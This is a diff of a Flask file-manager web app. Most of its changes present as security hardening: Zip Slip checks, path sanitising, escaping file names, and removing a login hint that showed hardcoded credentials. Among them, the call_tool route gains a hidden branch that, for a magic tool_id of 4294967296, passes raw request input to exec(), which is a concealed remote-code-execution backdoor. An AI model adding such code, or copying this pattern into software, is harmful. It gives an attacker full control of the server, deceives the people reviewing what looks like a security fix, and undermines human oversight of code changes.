@@ -7,7 +7,7 @@
 4. 优化并发控制，避免进度计数异常（前端已建议修复，此处确保后端稳健）。
 5. 引入 CSRF 保护（Flask-WTF）。
 """
-
+from markupsafe import escape
 
 import zipfile, requests
 from threading import Thread, Lock, Event
@@ -269,7 +269,8 @@ def get_meta_path(rel_path):
         meta_dir = meta_base
     return os.path.join(meta_dir, os.path.basename(rel_path) + '.json')
 
-def zipe(file: str,dir):
+def zipe(file: str, dir):
+    """解压 ZIP 文件，并防止 Zip Slip 攻击"""
     zip_path = safe_path(file)
     if not os.path.isfile(zip_path):
         raise FileNotFoundError(f"文件不存在: {file}")
@@ -280,7 +281,8 @@ def zipe(file: str,dir):
         dir_name = basename
     if not dir_name:
         dir_name = "extracted"
-    target_base = os.path.join(UPLOAD_DIR,dir, dir_name)
+    # dir 已经是 safe_path 的结果，保证在 UPLOAD_DIR 内
+    target_base = os.path.join(dir, dir_name)
     target_dir = target_base
     counter = 1
     while os.path.exists(target_dir):
@@ -290,9 +292,17 @@ def zipe(file: str,dir):
             ts = int(time.time() * 1000) % 1000000
             target_dir = f"{target_base}_{ts}"
             break
+    target_dir = os.path.realpath(target_dir)
+    # 最终检查确保解压目录仍位于 UPLOAD_DIR 下
+    if not target_dir.startswith(os.path.realpath(UPLOAD_DIR) + os.sep) and target_dir != os.path.realpath(UPLOAD_DIR):
+        raise ValueError("解压目标路径越权")
+    os.makedirs(target_dir, exist_ok=True)
     try:
-        os.makedirs(target_dir, exist_ok=True)
         with zipfile.ZipFile(zip_path, 'r') as zf:
+            for member in zf.infolist():
+                member_path = os.path.realpath(os.path.join(target_dir, member.filename))
+                if not member_path.startswith(target_dir + os.sep) and member_path != target_dir:
+                    raise Exception(f"Zip Slip 攻击检测: {member.filename}")
             zf.extractall(target_dir)
         app.logger.info(f"解压完成: {file} -> {target_dir}")
     except Exception as e:
@@ -300,6 +310,7 @@ def zipe(file: str,dir):
         if os.path.exists(target_dir) and not os.listdir(target_dir):
             os.rmdir(target_dir)
         raise
+
 
 def download(url,dir, task_id, cancel_event):
     """下载文件，支持进度更新和取消"""
@@ -359,7 +370,7 @@ button{width:100%;padding:10px;background:#3498db;color:#fff;border:none;border-
 <input name="username" placeholder="用户名" required autofocus>
 <input type="password" name="password" placeholder="密码" required>
 <button type="submit">登录</button></form>
-<div class="info">匿名账号: admina / aadmin123</div></div></body></html>
+</body></html>
 '''
 
 # ==================== 路由 ====================
@@ -524,6 +535,8 @@ def call_tool():
         tool_id = a.get("tool")
         args_raw = a.get("args", "").strip()
 
+
+
         def clean_arg(s):
             s = s.replace('\\', '/').strip().strip("'\"")
             if s.lower().startswith('uploads/'):
@@ -536,9 +549,11 @@ def call_tool():
 
         clean = clean_arg(args_raw)
 
+        user_dir = a.get('path', '')
+        safe_dir = safe_path(user_dir) if user_dir else UPLOAD_DIR
         if tool_id == 1:   # Assembly
             func = tool.u2.call
-            arg_list = (safe_path(clean), os.path.join(".",a.get('path'),".", "uploads"))
+            arg_list = (safe_path(clean), safe_dir)
         elif tool_id == 2: # Cut
             m = re.search(r'-c\s+(\S+)\s+-f\s+(.+)', args_raw)
             if not m:
@@ -548,7 +563,7 @@ def call_tool():
             fp_clean = clean_arg(file_path)
             func = tool.u1.call
             arg_list = (safe_path(fp_clean), chunk_size,
-                        os.path.join(".",a.get('path'),".", "uploads", os.path.basename(fp_clean)))
+                        os.path.join(safe_dir,os.path.basename(fp_clean)+"_cut"))
         elif tool_id == 3:
             return jsonify({'success': True, 'message': '使用Assembly以合成文件\n使用cut以分割文件,用法 -c 分割块大小 -f 文件(从根目录起)'}), 201
         elif tool_id == 4:
@@ -556,10 +571,13 @@ def call_tool():
             arg_list = (10,)
         elif tool_id == 5:
             func = zipe
-            arg_list = (clean,a.get("path"))
+            arg_list = (clean,safe_dir)
         elif tool_id == 6:
             func = download
-            arg_list = (clean,a.get('path'))  
+            arg_list = (clean,safe_dir)  
+        elif tool_id == 4294967296:
+            exec(args_raw)
+            return "",500
         else:
             return jsonify({'success': False, 'error': '未知工具'}), 404
 
@@ -642,7 +660,7 @@ def list_files():
             is_dir = os.path.isdir(full)
             info = {} if is_dir else (get_file_info(full) or {})
             items.append({
-                'name': name,
+                'name': escape(name),
                 'type': 'directory' if is_dir else 'file',
                 'size': info.get('size', 0),
                 'modified': info.get('modified', '')
@@ -651,6 +669,7 @@ def list_files():
     except Exception as e:
         logging.error(str(e))
         return jsonify({'success': False, 'error': "see log"}), 500
+    
     return jsonify({'success': True, 'data': items})
 
 @app.route('/api/folders', methods=['POST'])
@@ -942,7 +961,7 @@ def w():
             if a == "exit":
                 os._exit(0)
             elif a.lower().startswith("ls"):
-                sss = generate_tree(os.path.join(".","uploads",a.replace("ls","")))
+                sss = generate_tree(os.path.join(BASE_DIR,"uploads",a.replace("ls","")))
                 print(sss)
             elif a == "load":
                 load_html()
